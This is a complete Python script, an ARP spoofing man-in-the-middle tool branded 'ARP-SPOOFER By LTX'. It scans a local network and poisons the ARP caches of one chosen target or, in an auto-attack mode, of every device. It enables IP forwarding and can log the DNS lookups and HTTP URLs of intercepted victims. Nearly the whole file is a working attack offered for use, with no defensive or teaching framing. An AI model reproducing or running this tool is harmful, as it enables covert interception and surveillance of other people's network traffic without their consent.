import scapy.all as scapy
from scapy.layers import http
import time
import sys
import argparse
import socket
import os
import threading
from colorama import Fore, Style, init

init(autoreset=True)

title = "ARP-SPOOFER - LTX74"
if os.name == 'nt':
    os.system(f'title {title}')
else:
    sys.stdout.write(f"\x1b]2;{title}\x07")

def get_gradient_color(step, total_steps):
    colors = [129, 135, 141, 147, 153, 159, 231, 255]
    index = int((step / total_steps) * (len(colors) - 1))
    return f"\033[38;5;{colors[index]}m"

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    lines = [
        " █████╗ ██████╗ ██████╗       ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ ",
        "██╔══██╗██╔══██╗██╔══██╗      ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗",
        "███████║██████╔╝██████╔╝█████╗███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝",
        "██╔══██║██╔══██╗██╔═══╝ ╚════╝╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗",
        "██║  ██║██║  ██║██║           ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║",
        "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝           ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝"
    ]
    
    for i, line in enumerate(lines):
        print(get_gradient_color(i, len(lines)) + line)
    
    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}ARP-SPOOFER | By LTX")

def get_arguments():
    parser = argparse.ArgumentParser(
        description=f"{Fore.LIGHTMAGENTA_EX}ARP-SPOOFER By LTX: Professional MITM Framework.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Fore.LIGHTCYAN_EX}EXAMPLES:
  {Fore.WHITE}python arp_spoofer.py -r 192.168.1.0/24 -g 192.168.1.1
  {Fore.WHITE}python arp_spoofer.py -r 192.168.1.0/24 -g 192.168.1.1 -a -s

{Fore.LIGHTMAGENTA_EX}NOTES:
  - Use -a to attack everyone on the network automatically.
  - Use -s to enable the live DNS/HTTP traffic sniffer.
        """
    )
    parser.add_argument("-r", "--range", dest="ip_range", required=True, help="Network range (e.g. 192.168.1.0/24)")
    parser.add_argument("-g", "--gateway", dest="gateway", required=True, help="Gateway IP address")
    parser.add_argument("-a", "--all", action="store_true", help="Auto-target everyone (Silent scan)")
    parser.add_argument("-s", "--sniff", action="store_true", help="Enable live traffic sniffing (DNS/HTTP)")
    return parser.parse_args()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def silent_scan(ip_range):
    answered_list = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip_range), timeout=2, verbose=False)[0]
    return [{"ip": element[1].psrc, "mac": element[1].hwsrc} for element in answered_list]

def visual_scan(ip_range):
    print(f"{Fore.BLUE}[*] Initializing Network Scan...")
    answered_list = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip_range), timeout=2, verbose=False)[0]
    clients = []
    
    print(f"\n{Fore.WHITE}┌{'─'*17}┬{'─'*22}┬{'─'*25}┐")
    print(f"{Fore.WHITE}│ {'IP Address':<15} │ {'MAC Address':<20} │ {'Device Name':<23} │")
    print(f"{Fore.WHITE}├{'─'*17}┼{'─'*22}┼{'─'*25}┤")
    
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        try: name = socket.gethostbyaddr(ip)[0][:23]
        except: name = "Unknown Device"
        clients.append({"ip": ip, "mac": mac})
        print(f"{Fore.WHITE}│ {Fore.GREEN}{ip:<15} {Fore.WHITE}│ {Fore.LIGHTBLACK_EX}{mac:<20} {Fore.WHITE}│ {Fore.MAGENTA}{name:<23} {Fore.WHITE}│")
    
    print(f"{Fore.WHITE}└{'─'*17}┴{'─'*22}┴{'─'*25}┘")
    return clients

def spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def process_packet(packet):
    if packet.haslayer(scapy.DNSQR):
        url = packet[scapy.DNSQR].qname.decode()
        print(f"\n{Fore.LIGHTMAGENTA_EX}[DNS LOG] {Fore.WHITE}{url.strip('.')}")
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(f"\n{Fore.GREEN}[WEB LOG] {Fore.WHITE}{url}")

def main():
    print_banner()
    args = get_arguments()
    
    if os.name != 'nt':
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    targets = []
    if args.all:
        print(f"{Fore.LIGHTCYAN_EX}[!] Auto-Attack Mode: Scanning network silently...")
        devices = silent_scan(args.ip_range)
        targets = [d for d in devices if d['ip'] != args.gateway]
    else:
        devices = visual_scan(args.ip_range)
        if not devices:
            print(f"{Fore.RED}[-] Error: No devices found."); return
        choice = input(f"\n{Fore.WHITE}[?] Select Target IP: ")
        mac = next((d['mac'] for d in devices if d['ip'] == choice), None)
        if mac: targets.append({'ip': choice, 'mac': mac})
        else: print(f"{Fore.RED}[-] Target not in list."); return

    gateway_mac = get_mac(args.gateway)
    if not gateway_mac:
        print(f"{Fore.RED}[!] Could not find Gateway MAC address."); return

    if args.sniff:
        print(f"{Fore.LIGHTCYAN_EX}[*] Traffic Sniffer: Online")
        sniff_thread = threading.Thread(target=lambda: scapy.sniff(prn=process_packet, store=False), daemon=True)
        sniff_thread.start()
    else:
        print(f"{Fore.YELLOW}[*] Traffic Sniffer: Offline (Use -s to enable)")

    print(f"\n{Fore.RED}[⚡] BY LTX - ATTACK ACTIVE ({len(targets)} Targets)")
    sent = 0
    try:
        while True:
            for t in targets:
                spoof(t['ip'], t['mac'], args.gateway)
                spoof(args.gateway, gateway_mac, t['ip'])
            sent += (2 * len(targets))
            print(f"\r{Fore.WHITE}Total Packets: {Fore.GREEN}{sent} {Fore.WHITE}| Press Ctrl+C to stop", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n\n{Fore.LIGHTCYAN_EX}[*] Restoring network state... Please wait.")
        try:
            for t in targets:
                restore(t['ip'], t['mac'], args.gateway, gateway_mac)
                restore(args.gateway, gateway_mac, t['ip'], t['mac'])
            print(f"{Fore.GREEN}[+] Network successfully restored. Exit.")
        except:
            print(f"{Fore.RED}[!] Error during restoration.")
        sys.exit(0)

if __name__ == "__main__":
    main()

# Made by LTX74
